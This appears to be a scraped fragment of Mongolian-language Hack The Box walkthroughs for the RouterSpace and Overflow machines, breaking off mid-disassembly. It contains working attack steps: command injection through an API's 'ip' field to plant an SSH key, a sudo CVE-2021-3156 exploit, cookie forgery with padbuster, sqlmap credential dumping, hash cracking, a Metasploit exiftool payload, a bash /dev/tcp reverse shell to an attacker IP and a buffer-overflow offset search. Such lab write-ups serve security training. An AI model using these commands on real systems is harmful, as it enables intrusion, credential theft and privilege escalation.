gid=1001(paul) groups=1001(paul)\\n\u0026#34; 4. SSH .ssh байгааг шалгах:\nPOST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1 accept: application/json, text/plain, */* user-agent: RouterSpaceAgent Content-Type: application/json Content-Length: 36 Host: routerspace.htb Connection: close Accept-Encoding: gzip, deflate {\u0026#34;ip\u0026#34;:\u0026#34;\\nls -la /home/paul/.ssh\u0026#34;} ### HTTP/1.1 200 OK X-Powered-By: RouterSpace X-Cdn: RouterSpace-88312 Content-Type: application/json; charset=utf-8 Content-Length: 102 ETag: W/\u0026#34;66-16qi+Er+2AnScuVbth8VO+vonXE\u0026#34; Date: Mon, 07 Mar 2022 10:37:06 GMT Connection: close \u0026#34;\\ntotal 8\\ndrwx------ 2 paul paul 4096 Feb 17 18:30 .\\ndrwxr-xr-x 8 paul paul 4096 Feb 17 18:30 ..\\n\u0026#34; public id_rsa -г paul -н .ssh дотор хуулж өгөх.\n# Local VM ssh-keygen ls -la total 8 drwx------ 1 va4mi va4mi 32 Mar 7 05:38 . drwxr-xr-x 1 va4mi va4mi 766 Mar 7 05:38 .. -rw------- 1 va4mi va4mi 2610 Mar 7 05:38 id_rsa -rw-r--r-- 1 va4mi va4mi 576 Mar 7 05:38 id_rsa.pub burp-д:\n\u0026#34;\\necho \u0026#39;your public id_rsa.pub\u0026#39; \u0026gt;\u0026gt; /home/paul/.ssh/authorized_keys\u0026#34; chmod 600 id_rsa ssh -i id_rsa paul@10.10.11.148 user.txt\n159092******** 5. Privilege escalation 5.1 linpeas scp -i /root/.ssh/id_rsa linpeas.sh paul@10.10.11.148 chmod +x linpeas.sh /.linpeas.sh | tee output ╔══════════╣ Sudo version ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.31 5.2 CVE-2021-3156 https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py Machine VM:\nscp -i /root/.ssh/id_rsa exploit.py paul@10.10.11.148:. python3 exploit.py # id uid=0(root) gid=0(root) groups=0(root),1001(pau root.txt\nf4f2e0ec********* ","permalink":"https://cadil.github.io/posts/2024-03-08-htb-routerspace-writeup/","summary":"1. IP Address # Machine Address 10.10.11.148 # Local Address 10.10.14.26 2. Nmap cli:\nnmap -sV -sC -oA nmap/routerspace 10.10.11.148 out:\n# Nmap 7.92 scan initiated Thu Mar 3 22:22:16 2022 as: nmap -sV -sC -oA nmap/routerspace 10.10.11.148 Nmap scan report for 10.10.11.148 Host is up (0.24s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-RouterSpace Packet Filtering V1 | ssh-hostkey: | 3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA) | 256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA) |_ 256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519) 80/tcp open http | fingerprint-strings: | FourOhFourRequest: | HTTP/1.","title":"HTB - RouterSpace"},{"content":"1. IP Address # Machine Address 10.10.11.136 # Local Address 10.10.14.4 2. Nmap nmap -sV -sC -oA nmap/overflow 10.10.11.119 Out:\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 01:01 EST Nmap scan report for 10.10.11.119 Host is up (0.24s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA) | 256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA) |_ 256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Overflow Sec Service Info: Host: overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 65.74 seconds sudo nmap -sU -sV -sC 10.10.11.119 --min-rate 7500 -F Out:\nNmap scan report for 10.10.11.119 Host is up (0.24s latency). Not shown: 94 open|filtered ports PORT STATE SERVICE VERSION 497/udp closed retrospect 1026/udp closed win-rpc 1646/udp closed radacct 1719/udp closed h323gatestat 33281/udp closed unknown 49156/udp closed unknown Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 683.43 seconds sudo nmap -sU -top-ports=20 overflow.htb Out:\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 02:34 EST Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 80.00% done; ETC: 02:35 (0:00:01 remaining) Nmap scan report for overflow.htb (10.10.11.119) Host is up (0.25s latency). PORT STATE SERVICE 53/udp closed domain 67/udp open|filtered dhcps 68/udp closed dhcpc 69/udp closed tftp 123/udp closed ntp 135/udp open|filtered msrpc 137/udp closed netbios-ns 138/udp closed netbios-dgm 139/udp closed netbios-ssn 161/udp closed snmp 162/udp closed snmptrap 445/udp closed microsoft-ds 500/udp open|filtered isakmp 514/udp closed syslog 520/udp closed route 631/udp closed ipp 1434/udp closed ms-sql-m 1900/udp closed upnp 4500/udp closed nat-t-ike 49152/udp closed unknown nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.119 nmap -p 22,25,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.119 3. Gobuster gobuster dir -u http://overflow.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt Out:\n=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://overflow.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/02/27 01:26:34 Starting gobuster in directory enumeration mode =============================================================== /home (Status: 301) [Size: 311] [--\u0026gt; http://overflow.htb/home/] /assets (Status: 301) [Size: 313] [--\u0026gt; http://overflow.htb/assets/] /config (Status: 301) [Size: 313] [--\u0026gt; http://overflow.htb/config/] /config\ngobuster dir -u http://overflow.htb/config -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php Хэрэгтэй зүйл байгаагүй.\n4. SQL Truncation Эхлээд admin-нэртэй user давхар үүсгээд cookie авах гэсэн, болоогүй. Admin араас 45 удаа зай аваад үзэхээр болоогүй, admin өмнө нь нэг зай аваад гарсан cookie:\nGET /home/index.php HTTP/1.1 Host: overflow.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://overflow.htb/register.php DNT: 1 Connection: close Cookie: auth=%2FoVZR9sAqmC53eoXs2m0%2BJkzW6wotphC Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 4.1 Padbuster digging хийж байгаад padbuster -р cookie авах болсон padbuster\npadbuster http://overflow.htb/login.php soVMzOVc6tujv2WuGlrUk%2F8reumdJbOp 8 -cookie auth=soVMzOVc6tujv2WuGlrUk%2F8reumdJbOp -plaintext user=admin Out:\n------------------------------------------------------- ** Finished *** [+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA ------------------------------------------------------- http://overflow.htb/admin_cms_panel/admin/login.php\n5. CMS Made Simple http://overflow.htb/admin_cms_panel/admin/\ncli:\ngobuster dir -u http://overflow.htb/admin_cms_panel/admin -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php out:\nGobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://overflow.htb/admin_cms_panel/admin [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Timeout: 10s =============================================================== 2022/03/12 07:19:41 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 302) [Size: 0] [--\u0026gt; http://overflow.htb/admin_cms_panel/admin/login.php] /login.php (Status: 200) [Size: 4816] /templates (Status: 301) [Size: 338] [--\u0026gt; http://overflow.htb/admin_cms_panel/admin/templates/] /themes (Status: 301) [Size: 335] [--\u0026gt; http://overflow.htb/admin_cms_panel/admin/themes/] /header.php (Status: 500) [Size: 0] /footer.php (Status: 500) [Size: 0] /plugins (Status: 301) [Size: 336] [--\u0026gt; http://overflow.htb/admin_cms_panel/admin/plugins/] /style.php (Status: 200) [Size: 53969] /lang (Status: 301) [Size: 333] [--\u0026gt; http://overflow.htb/admin_cms_panel/admin/lang/] /logout.php (Status: 302) [Size: 0] [--\u0026gt; http://overflow.htb/admin_cms_panel/admin/login.php] /myaccount.php (Status: 302) [Size: 0] [--\u0026gt; http://overflow.htb/admin_cms_panel/admin/login.php] =============================================================== 2022/03/12 07:26:16 Finished =============================================================== онцгой зүйл алга. одоогоор\u0026hellip;\nhttp://overflow.htb/admin_cms_panel/doc/CHANGELOG.txt\nVersion 2.2.8 - Flin Flon burp out:\nGET /admin_cms_panel/admin/login.php HTTP/1.1 Host: overflow.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Cookie: auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA; CMSSESSIDf25decdf38ae=i1qs15u63sha9jh7a9c7s7ag10 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 cli:\nsqlmap -r login.req --level 5 --risk 3 --threads 10 5.1 msfconsole cli:\nMatching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/cmsms_object_injection_rce 2019-03-26 normal Yes CMS Made Simple Authenticated RCE via object injection дээрх болоогүй, python2, bound хийж байгаа нь таарахгүй.\ncli:\nsudo apt update \u0026amp;\u0026amp; sudo apt -y install exploitdb 2.2.8 дээр ажиллах нь python2 дээр бичигдсэн. Pyenv суулгаад бас болохгүй байна\u0026hellip;\n6. SQLMap http://overflow.htb/config/admin_last_login.js\nasync function getUsers() { let url = \u0026#39;http://overflow.htb/home/logs.php?name=admin\u0026#39;; try { let res = await fetch(url); return await res.text(); } catch (error) { console.log(error); } } async function renderUsers() { let users = await getUsers(); let html = \u0026#39;\u0026#39;; let container = document.querySelector(\u0026#39;.content\u0026#39;); container.innerHTML = users; } renderUsers(); cli:\nsqlmap -u http://overflow.htb/home/logs.php?name= --cookie auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA cli:\nsqlmap -u http://overflow.htb/home/logs.php?name= --cookie auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA --dbs out:\n[12:41:05] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu 18.04 (bionic) web application technology: Apache 2.4.29 back-end DBMS: MySQL \u0026gt;= 5.0.12 [12:41:05] [INFO] fetching database names available databases [4]: [*] cmsmsdb [*] information_schema [*] logs [*] Overflow cli:\nsqlmap -u http://overflow.htb/home/logs.php?name= --cookie auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA cmsmsdb --tables out:\n| cms_module_templates | | cms_modules | | cms_permissions | | cms_permissions_seq | | cms_routes | | cms_siteprefs | | cms_user_groups | | cms_userplugins | | cms_userplugins_seq | | cms_userprefs | | cms_users | | cms_users_seq | | cms_version | +---------------------------------------+ cms_users\ncli:\nsqlmap -u http://overflow.htb/home/logs.php?name= --cookie auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA -D cmsmsdb -T cms_users --dump out:\nDatabase: cmsmsdb Table: cms_users [2 entries] +---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+ | user_id | email | active | password | username | last_name | first_name | create_date | admin_access | modified_date | +---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+ | 1 | admin@overflow.htb | 1 | c6c6b9310e0e6f3eb3ffeb2baff12fdd | admin | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | 2021-05-24 21:18:35 | 1 | 2021-05-26 14:49:15 | | 3 | \u0026lt;blank\u0026gt; | 1 | e3d748d58b58657bfa4dffe2def0b1c7 | editor | \u0026lt;blank\u0026gt; | editor | 2021-05-25 06:38:33 | 1 | 2021-05-26 04:13:58 | +---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+ admin@overflow.htb:c6c6b9310e0e6f3eb3ffeb2baff12fdd:admin \u0026lt;blank\u0026gt;:e3d748d58b58657bfa4dffe2def0b1c7:editor\nsalt\nsqlmap -u \u0026#39;http://overflow.htb/home/logs.php?name=\u0026#39; --cookie auth=BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA -D cmsmsdb -T cms_siteprefs --dump | sitemask | 6c2d17f37e226486\nhash:\ne3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486 6.1 Hashcat cli:\nhashcat -m 20 hash /usr/share/wordlists/rockyou.txt ### Result e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486:alpha!@#$%bravo editor:alpha!@#$%bravo devbuild-job.overflow.htb etc/host дотор нэмэх -\u0026gt; devbuild-job.overflow.htb\nUpload хийх боломжтой хэсэг: 6.2 Msfconsole with exiftool cli:\nmsf6 \u0026gt; use 0 [*] No payload configured, defaulting to cmd/unix/reverse_netcat msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) \u0026gt; options Module options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection): Name Current Setting Required Description ---- --------------- -------- ----------- FILENAME msf.jpg yes Output file Payload options (cmd/unix/reverse_netcat): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.1.37 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port **DisablePayloadHandler: True (no handler will be created!)** Exploit target: Id Name -- ---- 0 JPEG file msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) \u0026gt; set LHOST 10.10.14.36 LHOST =\u0026gt; 10.10.14.36 msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) \u0026gt; set LPORT 9001 LPORT =\u0026gt; 9001 msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) \u0026gt; 6.3 nc with shell balance nc -lvnp 9001 ### listening on [any] 9001 ... connect to [10.10.14.36] from (UNKNOWN) [10.10.11.119] 56042 ls index.php resume_upload.php script.js style.css id uid=33(www-data) gid=33(www-data) groups=33(www-data) shell balance:\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ctrl+z\nstty raw -echo f+g [enter enter] буцаад nc орлоо\nexport TERM=xterm 7. Exploitation cli: /linpeas/\npython3 -m http.server ## Machine curl 10.10.14.108:8000/linpeas.sh -o linpeas.sh out:\n╔══════════╣ Searching passwords in config PHP files $config[\u0026#39;db_password\u0026#39;] = \u0026#39;sh@tim@n\u0026#39;; $this-\u0026gt;_types[\u0026#39;db_password\u0026#39;] = self::TYPE_STRING; #define(\u0026#39;DB_Password\u0026#39;,\u0026#39;root\u0026#39;); #define(\u0026#39;DB_Username\u0026#39;, \u0026#39;root\u0026#39;); ╔══════════╣ Unexpected in /opt (usually empty) total 16 drwxr-xr-x 3 root root 4096 Sep 17 21:56 . drwxr-xr-x 25 root root 4096 Jan 26 21:08 .. -rwxr-x---+ 1 tester tester 109 May 28 2021 commontask.sh drwxr-x---+ 2 root root 4096 Sep 17 21:56 file_encrypt developer:sh@tim@n\nssh:\nssh developer@overflow.htb uid=1001(developer) gid=1001(developer) groups=1001(developer),1002(network) ## user.txt $ cat user.txt cat: user.txt: Permission denied commontask.sh\ncommontask.sh file_encrypt $ cat commontask.sh #!/bin/bash #make sure its running every minute. bash \u0026lt; \u0026lt;(curl -s http://taskmanage.overflow.htb/task.sh) commontask -тай адил script үүсгэх\necho \u0026#34;10.10.14.41 taskmanage.overflow.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts machine дах etc/hosts дотор өөрийн vm IP-г өгнө. taskmanage - subdomain байхгүй болохоор\n# The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters $ echo \u0026#34;10.10.14.108 taskmanage.overflow.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts $ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 overflow overflow.htb # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.14.36 taskmanage.overflow.htb VM -с\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.41/9001 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; task.sh sudo python3 -m http.server 80 nc -lvnp 9001 үүсгээд тэгээд хүлээнэ.\nuser.txt\n647b4a********** 8. Enumeration 8.1 ssh cli:\nssh-keygen cd .ssh cp id_rsa.pub authorized_keys chmod 600 ./authorized_keys id_rsa\n-----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKC********** -----END RSA PRIVATE KEY----- cli:\nchmod 600 id_rsa ssh tester@overflow.htb -i id_rsa file_encrypt:\ntester@overflow:/opt$ cd file_encrypt total 16K -rwsr-xr-x 1 root root 12K May 31 2021 file_encrypt -rw-r--r-- 1 root root 399 May 30 2021 README.md linpeas:\npython3 -m http.server ## Machine curl 10.10.14.108:8000/linpeas.sh -o linpeas.sh chmod +x linpeas.sh linpeas хэрэгтэй зүйл байгаагүй.\nREADME.md\ntester@overflow:/opt$ cat file_encrypt/README.md Our couple of reports have been leaked to avoid this. We have created a tool to encrypt your reports. Please check the pin feature of this application and report any issue that you get as this application is still in development. We have modified the tool a little bit that you can only use the pin feature now. The encrypt function is there but you can\u0026#39;t use it now.The PIN should be in your inbox 8.2 file_encrypt ./file_encrypt\ntester@overflow:/opt/file_encrypt$ ./file_encrypt This is the code 1804289383. Enter the Pin: 555 Wrong Pin VM руу file_encrypt хуулах:\nscp -i ../ssh_keys/tester tester@overflow:/opt/file_encrypt/file_encrypt ./file_encrypt scp -i id_rsa tester@overflow.htb:/opt/file_encrypt/file_encrypt ./file_encrypt sha256sum-р алдаагүй хуулсан эсэх шалган үзэх.\n# Machine VM: 33246b48006e9967c59e332390ae698f99ad75bc05d80e6c8e61c66cd634eff9 file_encrypt # Local VM 33246b48006e9967c59e332390ae698f99ad75bc05d80e6c8e61c66cd634eff9 file_encrypt 8.3 Ghidra check_pin - filter -с хайж үзэх: /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */ void check_pin(void) { undefined local_2c [20]; int local_18; long local_14; int local_10; local_10 = rand(); local_14 = random(); printf(\u0026#34;This is the code %i. Enter the Pin: \u0026#34;,local_10); __isoc99_scanf(\u0026amp;DAT_00010d1d,\u0026amp;local_18); if (local_14 == local_18) { printf(\u0026#34;name: \u0026#34;); __isoc99_scanf(\u0026amp;DAT_00010c63,local_2c); puts( \u0026#34;Thanks for checking. You can give your feedback for improvements at developer@overflow.htb\u0026#34; ); } else { puts(\u0026#34;Wrong Pin\u0026#34;); } return; } local_14 = random(); - Call RANDOM дуудаж байгааг шалгаж үзэх:\n/* WARNING: Function: __x86.get_pc_thunk.ax replaced with injection: get_pc_thunk_ax */ /* WARNING: Unknown calling convention yet parameter storage is locked */ long random(void) { uint in_stack_00000004; uint local_c; int local_8; local_c = 0x6b8b4567; for (local_8 = 0; local_8 \u0026lt; 10; local_8 = local_8 + 1) { local_c = local_c * 0x59 + 0x14; } return local_c ^ in_stack_00000004; } in_stack_00000004 - дахин тодорхойлох (xor,ing)\n8.4 gdb cli:\ngdb file_encrypt out:\n(gdb) disas random Dump of assembler code for function random: 0x0000081d \u0026lt;+0\u0026gt;: push %ebp 0x0000081e \u0026lt;+1\u0026gt;: mov %esp,%ebp 0x00000820 \u0026lt;+3\u0026gt;: sub $0x10,%esp 0x00000823 \u0026lt;+6\u0026gt;: call 0xb90 \u0026lt;__x86.get_pc_thunk.ax\u0026gt; 0x00000828 \u0026lt;+11\u0026gt;: add $0x2778,%eax 0x0000082d \u0026lt;+16\u0026gt;: movl $0x6b8b4567,-0x8(%ebp) 0x00000834 \u0026lt;+23\u0026gt;: movl $0x0,-0x4(%ebp) 0x0000083b \u0026lt;+30\u0026gt;: jmp 0x84d \u0026lt;random+48\u0026gt; 0x0000083d \u0026lt;+32\u0026gt;: mov -0x8(%ebp),%eax 0x00000840 \u0026lt;+35\u0026gt;: imul $0x59,%eax,%eax 0x00000843 \u0026lt;+38\u0026gt;: add $0x14,%eax 0x00000846 \u0026lt;+41\u0026gt;: mov %eax,-0x8(%ebp) 0x00000849 \u0026lt;+44\u0026gt;: addl $0x1,-0x4(%ebp) 0x0000084d \u0026lt;+48\u0026gt;: cmpl $0x9,-0x4(%ebp) 0x00000851 \u0026lt;+52\u0026gt;: jle 0x83d \u0026lt;random+32\u0026gt; 0x00000853 \u0026lt;+54\u0026gt;: mov -0x8(%ebp),%eax 0x00000856 \u0026lt;+57\u0026gt;: xor 0x8(%ebp),%eax 0x00000859 \u0026lt;+60\u0026gt;: leave 0x0000085a \u0026lt;+61\u0026gt;: ret End of assembler dump. 0x00000856 \u0026lt;+57\u0026gt;: xor 0x8(%ebp),%eax xor -н breakpoint\nb * random+57 (gdb) b * random+57 Breakpoint 1 at 0x856 breakpoint хүртэл run хийх\nr x /10x $ebp +8 0xffffd460: 0x6b8b4567 0x56557fa0 0xf7fa7000 0x56555ac7 0xffffd470: 0xf7fa7000 0xf7fe3230 0x00000000 0xf7df9bde 0xffffd480: 0xf7fa73fc 0x56557fa0 #!/usr/bin/python3 import ctypes local_c_initial = 0x6b8b4567 local_c = 0x6b8b4567 local_8 = 0 while (local_8\u0026lt;10): local_c = local_c * 0x59 + 0x14 local_8 = local_8 + 1 PIN = ctypes.c_int(local_c ^ local_c_initial).value print(\u0026#34;The Pin Code is:\u0026#34;, PIN) run:\nThe Pin Code is: -202976456 -202976456\ntester@overflow:/opt/file_encrypt$ ./file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: asdasdsadas Thanks for checking. You can give your feedback for improvements at developer@overflow.htb tester@overflow:/opt/file_encrypt$ Segmentation fault (core dumped)\ntester@overflow:/opt/file_encrypt$ ^C tester@overflow:/opt/file_encrypt$ ./file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Segmentation fault (core dumped) gdb -гээс адил нэр хийж харвал:\nGNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git Copyright (C) 2021 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \u0026#34;show copying\u0026#34; and \u0026#34;show warranty\u0026#34; for details. This GDB was configured as \u0026#34;x86_64-linux-gnu\u0026#34;. Type \u0026#34;show configuration\u0026#34; for configuration details. For bug reporting instructions, please see: \u0026lt;https://www.gnu.org/software/gdb/bugs/\u0026gt;. Find the GDB manual and other documentation resources online at: \u0026lt;http://www.gnu.org/software/gdb/documentation/\u0026gt;. For help, type \u0026#34;help\u0026#34;. Type \u0026#34;apropos word\u0026#34; to search for commands related to \u0026#34;word\u0026#34;... Reading symbols from file_encrypt... (No debugging symbols found in file_encrypt) (gdb) r Starting program: /home/va4mi/Documents/htb/machine/Overflow/www/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Program received signal SIGSEGV, Segmentation fault. 0x41414141 in ?? () 0x41414141 in ?? () AAAA -н HEX утга (EIP register)\n8.5 pattern_create.rb /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9 pattern_create ашиглаж 300 string үүсгээд name-n (gdb) оруулна.\n(gdb) r The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /home/va4mi/Documents/htb/machine/Overflow/www/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9 Thanks for checking. You can give your feedback for improvements at developer@overflow.htb Program received signal SIGSEGV, Segmentation fault. 0x35624134 in ?? () 0x35624134 in ?? ()\n8.6 pattern_offset.rb usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 300 -q 0x35624134 [*] Exact match at offset 44 CTRL+c\n(gdb) r The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /home/va4mi/Documents/htb/machine/Overflow/www/file_encrypt This is the code 1804289383. Enter the Pin: -202976456 name: ^C Program received signal SIGINT, Interrupt. 0xf7fd0559 in __kernel_vsyscall () disas encrypt\n(gdb) disas encrypt Dump of assembler code for function encrypt: 0x5655585b \u0026lt;+0\u0026gt;: push %ebp 0x5655585c \u0026lt;+1\u0026gt;: mov %esp,%ebp 0x5655585e \u0026lt;+3\u0026gt;: push %ebx 0x5655585f \u0026lt;+4\u0026gt;: sub $0x94,%esp 0x56555865 \u0026lt;+10\u0026gt;: call 0x56555720 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 0x5655586a \u0026lt;+15\u0026gt;: add $0x2736,%ebx 0x56555870 \u0026lt;+21\u0026gt;: movl $0x0,-0x80(%ebp) 0x56555877 \u0026lt;+28\u0026gt;: movl $0x0,-0x7c(%ebp) 0x5655587e \u0026lt;+35\u0026gt;: movl $0x0,-0x78(%ebp) 0x56555885 \u0026lt;+42\u0026gt;: movl $0x0,-0x74(%ebp) 0x5655588c \u0026lt;+49\u0026gt;: movl $0x0,-0x70(%ebp) 0x56555893 \u0026lt;+56\u0026gt;: movl $0x0,-0x94(%ebp) 0x5655589d \u0026lt;+66\u0026gt;: movl $0x0,-0x90(%ebp) 0x565558a7 \u0026lt;+76\u0026gt;: movl $0x0,-0x8c(%ebp) 0x565558b1 \u0026lt;+86\u0026gt;: movl $0x0,-0x88(%ebp) 0x565558bb \u0026lt;+96\u0026gt;: movl $0x0,-0x84(%ebp) 0x565558c5 \u0026lt;+106\u0026gt;: sub $0xc,%esp 0x565558c8 \u0026lt;+109\u0026gt;: lea -0x2350(%ebx),%eax 0x565558ce \u0026lt;+115\u0026gt;: push %eax 0x565558cf \u0026lt;+116\u0026gt;: call 0x565555e0 \u0026lt;printf@plt\u0026gt; 0x565558d4 \u0026lt;+121\u0026gt;: add $0x10,%esp 0x565558d7 \u0026lt;+124\u0026gt;: sub $0x8,%esp 0x565558da \u0026lt;+127\u0026gt;: lea 